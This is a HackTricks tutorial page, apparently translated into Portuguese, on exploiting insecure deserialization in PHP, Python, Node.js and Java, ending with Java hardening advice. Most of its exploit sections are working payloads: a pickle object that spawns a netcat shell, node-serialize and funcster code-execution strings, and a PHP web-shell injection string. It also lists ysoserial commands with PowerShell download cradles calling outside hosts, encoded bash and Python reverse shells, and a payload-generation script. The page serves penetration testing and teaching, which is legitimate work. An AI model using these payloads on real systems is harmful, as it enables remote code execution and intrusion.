# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

**Serialization** é entendida como o método de converter um objeto em um formato que pode ser preservado, com a intenção de armazenar o objeto ou transmiti-lo como parte de um processo de comunicação. Esta técnica é comumente empregada para garantir que o objeto possa ser recriado posteriormente, mantendo sua estrutura e estado.

**Deserialization**, conversely, é o processo que contraria a Serialization. Envolve pegar dados que foram estruturados em um formato específico e reconstruí-los de volta em um objeto.

Deserialization pode ser perigosa porque potencialmente **permite que atacantes manipulem os dados serialized para executar código malicioso** ou causem comportamento inesperado na aplicação durante o processo de reconstrução do objeto.

## PHP

Em PHP, métodos mágicos específicos são utilizados durante os processos de Serialization e Deserialization:

- `__sleep`: Invocado quando um objeto está sendo serialized. Este método deve retornar um array com os nomes de todas as propriedades do objeto que devem ser serialized. É comumente usado para gravar dados pendentes ou executar tarefas de limpeza semelhantes.
- `__wakeup`: Chamado quando um objeto está sendo deserialized. É usado para restabelecer quaisquer conexões de banco de dados que possam ter sido perdidas durante a Serialization e para executar outras tarefas de reinicialização.
- `__unserialize`: Este método é chamado em vez de `__wakeup` (se existir) quando um objeto está sendo deserialized. Ele fornece mais controle sobre o processo de Deserialization em comparação com `__wakeup`.
- `__destruct`: Este método é chamado quando um objeto está prestes a ser destruído ou quando o script termina. Tipicamente é usado para tarefas de limpeza, como fechar handles de arquivo ou conexões de banco de dados.
- `__toString`: Este método permite que um objeto seja tratado como uma string. Pode ser usado para ler um arquivo ou outras tarefas baseadas nas chamadas de função dentro dele, fornecendo efetivamente uma representação textual do objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Se você olhar os resultados pode ver que as funções **`__wakeup`** e **`__destruct`** são chamadas quando o objeto é desserializado. Note que em vários tutoriais você encontrará que a função **`__toString`** é chamada ao tentar imprimir algum atributo, mas aparentemente isso **não acontece mais**.

> [!WARNING]
> O método **`__unserialize(array $data)`** é chamado **em vez de `__wakeup()`** se estiver implementado na classe. Ele permite desserializar o objeto fornecendo os dados serializados como um array. Você pode usar este método para desserializar propriedades e executar quaisquer tarefas necessárias durante a desserialização.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Você pode ler um exemplo explicado em **PHP aqui**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqui [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou aqui [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Desserialização + Autoload de Classes

Você pode abusar da funcionalidade autoload do PHP para carregar arquivos php arbitrários e mais:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializing Referenced Values

Se por algum motivo você quiser serializar um valor como uma **referência para outro valor serializado** você pode:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Prevenindo PHP Object Injection com `allowed_classes`

> [!INFO]
> Suporte para o **segundo argumento** de `unserialize()` (o array `$options`) foi adicionado no **PHP 7.0**. Em versões mais antigas a função aceita apenas a string serializada, tornando impossível restringir quais classes podem ser instanciadas.

`unserialize()` irá **instanciar todas as classes** que encontrar no fluxo serializado, a menos que instruído o contrário. Desde o PHP 7 o comportamento pode ser restrito com a opção [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Se **`allowed_classes` estiver omitido _ou_ o código rodar em PHP < 7.0**, a chamada torna-se **perigosa**, pois um atacante pode criar um payload que abusa de métodos mágicos como `__wakeup()` ou `__destruct()` para obter Remote Code Execution (RCE).

#### Exemplo real: Everest Forms (WordPress) CVE-2025-52709

O plugin WordPress **Everest Forms ≤ 3.2.2** tentou ser defensivo com um wrapper auxiliar mas esqueceu das versões legadas do PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Em servidores que ainda executavam **PHP ≤ 7.0** esse segundo ramo levava a um clássico **PHP Object Injection** quando um administrador abria uma submissão de formulário maliciosa. Um payload mínimo de exploit poderia ser:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Assim que o admin visualizou a entrada, o objeto foi instanciado e `SomeClass::__destruct()` foi executado, resultando em execução arbitrária de código.

**Principais conclusões**
1. Sempre passe `['allowed_classes' => false]` (ou uma lista branca estrita) ao chamar `unserialize()`.
2. Audite wrappers defensivos – eles frequentemente esquecem dos ramos legados do PHP.
3. Atualizar para **PHP ≥ 7.x** por si só *não* é suficiente: a opção ainda precisa ser fornecida explicitamente.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) pode ajudar você a gerar payloads para abusar de deserializações PHP.\
Observe que em vários casos você **não será capaz de encontrar uma forma de abusar de uma deserialização no código-fonte** da aplicação, mas pode ser capaz de **abusar do código de extensões PHP externas.**\
Então, se possível, verifique o `phpinfo()` do servidor e **pesquise na internet** (e até nos **gadgets** do **PHPGGC**) por algum possível gadget que você possa abusar.

### phar:// metadata deserialization

Se você encontrou um LFI que está apenas lendo o arquivo e não executando o código php dentro dele, por exemplo usando funções como _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_. Você pode tentar abusar de uma **desserialização** ocorrendo ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informações leia o seguinte post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Quando o objeto é unpickled, a função \_\_\_reduce\_\_\_ será executada.\
Quando explorado, o servidor poderia retornar um erro.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Antes de verificar a técnica de bypass, tente usar `print(base64.b64encode(pickle.dumps(P(),2)))` para gerar um objeto que seja compatível com python2 se você estiver executando python3.

Para mais informações sobre como escapar de **pickle jails** confira:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

A página a seguir apresenta a técnica para **abuse an unsafe deserialization in yamls** nas bibliotecas python e termina com uma ferramenta que pode ser usada para gerar RCE deserialization payload para **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **não tem "magic" functions** como PHP ou Python que serão executadas apenas por criar um objeto. Mas ele possui algumas **functions** que são **frequentemente usadas mesmo sem serem chamadas diretamente** tais como **`toString`**, **`valueOf`**, **`toJSON`**.\
Se, ao abusar de uma deserialização, você puder **comprometer essas funções para executar outro código** (potencialmente abusando de prototype pollutions) você poderia executar código arbitrário quando elas forem chamadas.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Se quiser aprender sobre esta técnica **veja o tutorial a seguir**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta biblioteca permite serializar funções. Exemplo:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
O **objeto serializado** ficará assim:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Você pode ver no exemplo que, quando uma função é serialized, a flag `_$$ND_FUNC$$_` é anexada ao objeto serialized.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Como pode ver no último trecho de código, **se a flag for encontrada** o `eval` é usado para deserialize a função, então basicamente **a entrada do usuário está sendo usada dentro da função `eval`**.

No entanto, **apenas serialising** uma função **não irá executá-la**, pois seria necessário que alguma parte do código estivesse **chamando `y.rce`** no nosso exemplo e isso é altamente **improvável**.\
De qualquer forma, você poderia simplesmente **modificar o serialised object** **adicionando alguns parênteses** para executar automaticamente a serialized function quando o objeto for deserialized.\
No próximo trecho de código **note o último parêntese** e como a função `unserialize` irá executar automaticamente o código:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Como indicado anteriormente, esta biblioteca obterá o código após `_$$ND_FUNC$$_` e irá **executá-lo** usando `eval`. Portanto, para **auto-executar código** você pode **remover a parte de criação da função** e o último parêntese e **apenas executar um JS oneliner** como no exemplo a seguir:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Você pode [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **mais informações** sobre como explorar essa vulnerabilidade.

### [funcster](https://www.npmjs.com/package/funcster)

Um aspecto notável do **funcster** é a inacessibilidade dos **objetos integrados padrão**; eles ficam fora do escopo acessível. Essa restrição impede a execução de código que tenta invocar métodos em objetos integrados, levando a exceções tais como "ReferenceError: console is not defined" quando comandos como `console.log()` ou `require(something)` são usados.

Apesar dessa limitação, é possível restaurar o acesso completo ao contexto global, incluindo todos os objetos integrados padrão, por meio de uma abordagem específica. Ao acessar o contexto global diretamente, é possível contornar essa restrição. Por exemplo, o acesso pode ser restabelecido usando o seguinte trecho:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Para**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

O pacote **serialize-javascript** é projetado exclusivamente para propósitos de serialization, sem quaisquer capacidades de deserialization embutidas. Os usuários são responsáveis por implementar seu próprio método para deserialization. Um uso direto de `eval` é sugerido pelo exemplo oficial para deserializing serialized data:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Se esta função for usada para desserializar objetos, você pode **explorá-la facilmente**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

Nas páginas a seguir você pode encontrar informações sobre como abusar desta biblioteca para executar comandos arbitrários:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java, **deserialization callbacks are executed during the process of deserialization**. Essa execução pode ser explorada por atacantes que criam payloads maliciosos que disparam esses callbacks, levando à possível execução de ações prejudiciais.

### Fingerprints

#### White Box

Para identificar potenciais serialization vulnerabilities na base de código, procure por:

- Classes que implementam a interface `Serializable`.
- Uso de `java.io.ObjectInputStream`, funções `readObject`, `readUnshare`.

Preste atenção especial a:

- `XMLDecoder` utilizado com parâmetros definidos por usuários externos.
- O método `fromXML` do `XStream`, especialmente se a versão do XStream for menor ou igual a 1.46, pois é suscetível a issues de serialization.
- `ObjectInputStream` acoplado com o método `readObject`.
- Implementações de métodos como `readObject`, `readObjectNodData`, `readResolve`, ou `readExternal`.
- `ObjectInputStream.readUnshared`.
- Uso geral de `Serializable`.

#### Black Box

Para testes black box, procure por **signatures or "Magic Bytes"** específicas que denotem java serialized objects (originating from `ObjectInputStream`):

- Padrão hexadecimal: `AC ED 00 05`.
- Padrão Base64: `rO0`.
- Cabeçalhos de resposta HTTP com `Content-type` definido como `application/x-java-serialized-object`.
- Padrão hexadecimal indicando compressão prévia: `1F 8B 08 00`.
- Padrão Base64 indicando compressão prévia: `H4sIA`.
- Arquivos web com extensão `.faces` e o parâmetro `faces.ViewState`. Descobrir esses padrões em uma aplicação web deve levar a um exame conforme detalhado no [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar se é vulnerável

Se quiser aprender como funciona um exploit de Java Deserialization, veja [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), e [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization e pre-auth reachability

Codebases modernas às vezes envolvem a deserialization com `java.security.SignedObject` e validam uma assinatura antes de chamar `getObject()` (which deserializes the inner object). Isso previne arbitrary top-level gadget classes, mas ainda pode ser explorável se um atacante conseguir obter uma assinatura válida (por exemplo, private-key compromise ou um signing oracle). Além disso, fluxos de tratamento de erro podem mint session-bound tokens para usuários não autenticados, expondo sinks protegidos pre-auth.

Para um estudo de caso concreto com requests, IoCs, e orientações de hardening, veja:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### Teste White Box

Você pode verificar se há alguma aplicação instalada com vulnerabilidades conhecidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **verificar todas as bibliotecas** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Por favor, note que **gadgetinspector não criará um exploit e pode indicar falsos positivos**.

#### Black Box Test

Using the Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe is focused on **`ObjectInputStream` deserializations**.

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner is focused on **`ObjectInputStream`** deserializations.

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`** related vulnerabilities but **also** vulns from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Nem tudo é sobre verificar se alguma biblioteca vulnerável está sendo usada pelo servidor. Às vezes você pode conseguir **alterar os dados dentro do objeto serializado e contornar algumas validações** (talvez concedendo privilégios de admin dentro de uma webapp).\
Se você encontrar um objeto Java serializado sendo enviado para uma aplicação web, **você pode usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir de forma mais legível o objeto serializado que está sendo enviado**. Saber quais dados você está enviando facilita modificá-los e contornar algumas verificações.

### **Exploit**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Ao criar um payload para **java.lang.Runtime.exec()** você **não pode usar caracteres especiais** como ">" ou "|" para redirecionar a saída de uma execução, "$()" para executar comandos ou mesmo **passar argumentos** para um comando separados por **espaços** (você pode fazer `echo -n "hello world"` mas não pode fazer `python2 -c 'print "Hello world"'`). Para codificar corretamente o payload você poderia [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Sinta-se à vontade para usar o próximo script para criar **all the possible code execution** payloads para Windows e Linux e então testá-los na página web vulnerável:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Você pode **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto com ysoserial para criar mais exploits**. Mais informações sobre esta ferramenta nos **slides da palestra** onde a ferramenta foi apresentada: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) pode ser usado para gerar payloads para explorar diferentes bibliotecas de serialização **Json** e **Yml** em Java.\
Para compilar o projeto precisei **adicionar** estas **dependências** em `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instale o maven**, e **compile** o projeto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Leia mais sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratórios

- Se você quiser testar alguns payloads do ysoserial você pode **executar este webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por que

Java usa muita serialização para diversos propósitos, como:

- **Requisições HTTP**: A serialização é amplamente empregada no gerenciamento de parâmetros, ViewState, cookies, etc.
- **RMI (Remote Method Invocation)**: O protocolo Java RMI, que depende inteiramente da serialização, é uma pedra angular para comunicação remota em aplicações Java.
- **RMI over HTTP**: Este método é comumente usado por aplicações web Java com thick client, utilizando serialização para todas as comunicações de objetos.
- **JMX (Java Management Extensions)**: JMX utiliza serialização para transmitir objetos pela rede.
- **Custom Protocols**: Em Java, a prática padrão envolve a transmissão de objetos Java crus, o que será demonstrado em exemplos de exploit a seguir.

### Prevention

#### Objetos transient

Uma classe que implementa `Serializable` pode declarar como `transient` qualquer objeto dentro da classe que não deva ser serializável. Por exemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar a serialização de uma classe que precisa implementar Serializable

Em cenários onde certos **objetos devem implementar a interface `Serializable`** devido à hierarquia de classes, existe o risco de desserialização não intencional. Para evitar isso, assegure que esses objetos não sejam desserializáveis definindo um método `final` `readObject()` que lance consistentemente uma exceção, conforme mostrado abaixo:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Reforçando a Segurança da Desserialização em Java**

**Customizar `java.io.ObjectInputStream`** é uma abordagem prática para proteger os processos de desserialização. Este método é adequado quando:

- O código de desserialização está sob seu controle.
- As classes esperadas para desserialização são conhecidas.

Sobrescreva o método **`resolveClass()`** para limitar a desserialização apenas às classes permitidas. Isso previne a desserialização de qualquer classe, exceto as explicitamente autorizadas, como no exemplo abaixo que restringe a desserialização apenas à classe `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** oferece uma solução alternativa quando a modificação do código não é possível. Este método aplica-se principalmente para **blacklisting classes maliciosas**, usando um parâmetro JVM:
```
-javaagent:name-of-agent.jar
```
Ele fornece uma forma de proteger a desserialização dinamicamente, ideal para ambientes onde alterações de código imediatas são impraticáveis.

